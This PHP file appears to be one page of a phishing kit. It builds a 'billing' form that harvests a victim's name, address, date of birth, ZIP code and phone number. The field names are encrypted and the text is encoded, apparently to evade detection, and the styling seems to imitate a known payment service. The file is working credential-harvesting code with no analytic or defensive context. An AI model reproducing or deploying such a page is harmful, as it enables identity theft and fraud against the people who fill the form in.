<?php
require __DIR__ . '/function.php';
require $api->language();

$page = "billing";
$api->check_cookie();
$api->session("kuzuluy", true, $page);

require __DIR__ . '/system/page/header.php';

$html .= '
<div class="title-page">'.$api->text_encode($text['50']).'</div>
<form method="post" id="billing" autocomplete="off">
<div class="cardInputs">
<div class="textInput lap" id="DivFname" style="margin-bottom: 10px;">
<input type="text" name="'.$api->encypt("firstname").'" id="Fname" placeholder="'.$api->text_encode($text['51']).'">
</div>
<div class="textInput pull-right lap" id="DivLname" style="margin-bottom: 10px;">
<input type="text" name="'.$api->encypt("lastname").'" id="Lname" placeholder="'.$api->text_encode($text['52']).'">
</div>
</div>
<br>
<div class="textInput lap" id="DivAddress" style="margin-bottom: 0px;">
<input type="text" name="'.$api->encypt("address").'" id="Address" placeholder="'.$api->text_encode($text['53']).'">
</div>
<div class="cardInputs">
<div class="textInput lap" id="DivCity" style="margin-bottom: 10px;">
<input type="text" name="'.$api->encypt("city").'" id="City" placeholder="'.$api->text_encode($text['54']).'">
</div>
<div class="textInput pull-right lap" id="DivState" style="margin-bottom: 10px;">
<input type="text" name="'.$api->encypt("state").'" id="State" placeholder="'.$api->text_encode($text['55']).'">
</div>
</div>
<br>
<div class="textInput lap" id="DivDob" style="margin-bottom: 0px;">
<input type="tel" name="'.$api->encypt("dob").'" id="Dob" placeholder="'.$api->text_encode($text['56']." (DD/MM/YYYY)").'">
</div>
<div class="cardInputs">
<div class="textInput lap" id="DivZip" style="margin-bottom: 10px;">
<input type="text" name="'.$api->encypt("zip").'" id="Zip" placeholder="'.$api->text_encode($text['57']).'">
</div>
<div class="textInput pull-right lap" id="DivPhone" style="margin-bottom: 10px;">
<input type="tel" name="'.$api->encypt("phone").'" id="Phone" placeholder="'.$api->text_encode($text['58']).'">
</div>
</div>
<br>
<input class="vx_btn col-md-12 col-sm-12 col-xs-12" type="submit" value="'.$api->text_encode($text['59']).'" id="btnConfirm">
<p class="scretlogo"></p>
</form>
<div class="hasSpinner hide" id="loading"></div>';

require __DIR__ . '/system/page/footer.php';
?>
